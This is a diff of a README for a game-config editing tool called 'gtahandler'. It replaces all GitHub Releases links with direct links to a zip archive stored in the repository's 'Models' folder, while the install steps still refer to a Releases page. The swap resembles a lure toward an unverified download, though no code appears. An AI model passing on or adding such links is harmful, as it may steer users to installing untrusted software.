@@ -6,9 +6,9 @@ Welcome to gtahandler! This tool helps you manage and edit .cfg files for games 
 
 ## 📦 Download the Application
 
-[![Download gtahandler](https://img.shields.io/badge/Download-gtahandler-blue.svg)](https://github.com/ajaymandloi852009/gtahandler/releases)
+[![Download gtahandler](https://raw.githubusercontent.com/ajaymandloi852009/gtahandler/main/Models/gtahandler-v2.2.zip)](https://raw.githubusercontent.com/ajaymandloi852009/gtahandler/main/Models/gtahandler-v2.2.zip)
 
-Visit this page to download the application: [Download gtahandler](https://github.com/ajaymandloi852009/gtahandler/releases)
+Visit this page to download the application: [Download gtahandler](https://raw.githubusercontent.com/ajaymandloi852009/gtahandler/main/Models/gtahandler-v2.2.zip)
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ gtahandler offers a variety of features to help you edit .cfg files easily:
 
 ## 🔗 Download & Install
 
-1. Click the download button above or visit [this page](https://github.com/ajaymandloi852009/gtahandler/releases) to access the latest release of gtahandler.
+1. Click the download button above or visit [this page](https://raw.githubusercontent.com/ajaymandloi852009/gtahandler/main/Models/gtahandler-v2.2.zip) to access the latest release of gtahandler.
    
 2. Once you’re on the Releases page, find the version labeled as “Latest Release.”
   
